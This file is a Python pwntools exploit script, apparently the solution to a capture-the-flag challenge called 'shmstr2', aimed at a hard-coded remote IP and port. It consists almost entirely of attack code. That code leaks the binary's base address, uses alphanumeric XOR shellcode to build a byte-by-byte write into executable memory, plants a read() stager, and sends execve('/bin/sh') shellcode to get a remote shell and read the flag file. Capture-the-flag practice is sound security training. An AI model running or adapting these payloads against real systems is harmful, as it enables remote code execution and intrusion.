from pwn import *
# context.log_level = 'debug'
context.arch = 'i386'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './shmstr2'
HOST = '151.236.114.211'
PORT = 17183

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))


def add(shellcode):
	r.sendlineafter('> ', '1')
	r.sendafter(': ', shellcode)

def view(idx):
	r.sendlineafter('> ', '2')
	r.sendlineafter(': ',str(idx))

def delete(idx):
	r.sendlineafter('> ', '3')
	r.sendlineafter(': ',str(idx))

def run(idx):
	r.sendlineafter('> ', '4')
	r.sendlineafter(': ',str(idx))



r = start()

# leak pie
# extend limit
add(asm('''
pop eax;
push eax;
xor [ebx+0x71], dh;
xor al, 0x30;
xor al, 0x30;
xor al, 0x30;
xor al, 0x30;
inc ecx;
inc ecx;
inc ecx;
'''))
run(0)

r.recvuntil(' = ')
leak = int(r.recvuntil('\n', True), 16)
pie = leak - 0x17df
dbg('pie')
delete(0)

_32_SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\x31\xd2\xcd\x80"

import string
words = string.digits+string.ascii_letters + '!'

# 1byte write primitive to rwx with alphanumeric shellcode
# byte & 0x80 != 0 -> write 0xff -> write byte^0xff
# byte in words -> just write
# byte not in words -> write x where (x in words and x^byte in words) -> write x^byte

def rwx_write(c, offset):
	if ord(c) & 0x80 != 0:
		add(asm('''
		xor al, {};
		push eax;
		push 0x30;
		pop eax;
		xor al, 0x30;
		push eax;
		pop edx;
		dec edx;
		pop eax;
		xor [eax], dh;
		xor al, 0x30;
		'''.format(0x43+offset)))
		run(0)
		delete(0)
		# print "DEBUG:", hex(ord(c)^0xff)
		rwx_write(chr(ord(c) ^ 0xff), offset)
		return
		
	if c in words:
		add(asm('''
		xor al, {};
		push {};
		pop edx;
		xor [eax], dh;
		inc ecx;
		inc ecx;
		inc ecx;
		inc ecx;
		inc ecx;
		inc ecx;
		'''.format(0x43+offset, 0x31320034 | (ord(c) << 8))))
		run(0)
		delete(0)
	else:
		for x in words:
			new = chr(ord(x) ^ ord(c))
			if new in words:
				break
		if new == '!':
			print "fail to create: {}".format(hex(ord(c)))
			exit()
		rwx_write(new, offset)
		rwx_write(x, offset)

# read(0, rwx, big)
stager = asm('''
pop edx;
pop eax;
pop ebx;
pop ecx;
inc eax;
int 0x80;
''')

# write shellcode
for i, c in enumerate(stager):
	log.info("index:{}, char:{}".format(i, hex(ord(c))[2:]))
	rwx_write(c, i)

add(asm('''
jno $+0x43
'''))
if args.D:
	debug(r, [0x17dd])
run(0)
payload = 'A'*0x4a
payload += _32_SHELLCODE

context.log_level = 'debug'
r.send(payload)
sleep(1)
r.sendline("cat /tmp/flag.txt")
r.interactive()
r.close()
